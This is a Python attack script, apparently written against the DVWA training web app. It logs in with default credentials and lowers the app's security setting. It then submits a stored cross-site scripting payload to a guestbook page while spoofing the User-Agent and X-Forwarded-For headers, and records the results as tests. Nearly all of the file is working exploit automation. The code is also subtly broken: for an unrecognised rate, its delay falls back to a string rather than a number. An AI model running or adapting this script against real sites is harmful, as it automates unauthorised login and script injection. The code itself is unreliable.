from bs4 import BeautifulSoup
import requests
from datetime import datetime
from pathlib import Path
import sys
import json
import time
import os

# Setup initial configuration
logs_dir = Path('logs')
logs_dir.mkdir(exist_ok=True)
session = requests.Session()

if len(sys.argv) > 2:
    base_url = sys.argv[1]
    request_rate = sys.argv[2]
else:
    print("Base URL or request rate was not provided.")
    sys.exit(1)

# Map request rate to a specific time interval
delays = {'low': 10, 'medium': 5, 'high': 3}
delay = delays.get(request_rate, 'medium')  # Default to 'medium' if rate is unrecognized

xss_s_url = f"{base_url}/vulnerabilities/xss_s/"

# Headers to spoof User-Agent and IP address
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'X-Forwarded-For': '192.168.1.1'
}

# Construct the target URL for brute force attacks
target_url = f"{base_url}/vulnerabilities/brute/"
login_url = f"{base_url}/login.php"
security_url = f"{base_url}/security.php"


def login_and_setup_security():
    login_response = session.get(login_url)  
    soup = BeautifulSoup(login_response.text, 'html.parser')
    user_token = soup.find('input', {'name': 'user_token'}).get('value') if soup.find('input', {'name': 'user_token'}) else None

    login_data = {
        'username': 'admin',
        'password': 'password',
        'Login': 'Login',
        'user_token': user_token  
    }
    login_response = session.post(login_url, data=login_data, headers=headers)
    
    
    if 'PHPSESSID' in session.cookies:
        print("Login successful, PHPSESSID:", session.cookies['PHPSESSID'])
    else:
        print("Login failed")
        return

    
    security_response = session.get(security_url)
    soup = BeautifulSoup(security_response.text, 'html.parser')
    security_token = soup.find('input', {'name': 'user_token'}).get('value')
    security_data = {
        'security': 'low',
        'seclev_submit': 'Submit',
        'user_token': security_token
    }
    session.post(security_url, data=security_data, headers=headers)
    
def exploit_stored_xss():
    total_tests = 0
    tests_passed = 0
    tests_failed = 0
    details = []

    # Malicious payload
    payload = '<script>alert("XSS");</script>'
    data = {
        'Message': payload,
        'Name': 'Mitnick', 
    }

    # Send the malicious comment
    response = session.post(xss_s_url, data=data, headers=headers)
    total_tests += 1

    # Check whether the submission was successful based on the HTTP status
    if response.status_code == 200:
        tests_passed += 1
        result = "PASSED"
        print("Payload submitted successfully and might be executed when viewed.")
    else:
        tests_failed += 1
        result = "FAILED"
        print("Failed to submit the payload.")

    details.append({
        "payload": payload,
        "status_code": response.status_code,
        "result": result
    })
    
    
    time.sleep(delay)
    
    
    # Log results
    script_name = os.path.splitext(os.path.basename(__file__))[0]
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    file_name = f"results_{script_name}_{timestamp}.json"
    results_file = logs_dir / file_name
    result_summary = {
        'date_time': timestamp,
        'base_url': base_url,
        'total_tests': total_tests,
        'tests_passed': tests_passed,
        'tests_failed': tests_failed,
        'tested_url': xss_s_url,
        'details': details
    }
    with open(results_file, 'w') as f:
        json.dump(result_summary, f, indent=4)
    print(f"Results saved to {results_file}")

if __name__ == "__main__":
    login_and_setup_security()
    exploit_stored_xss()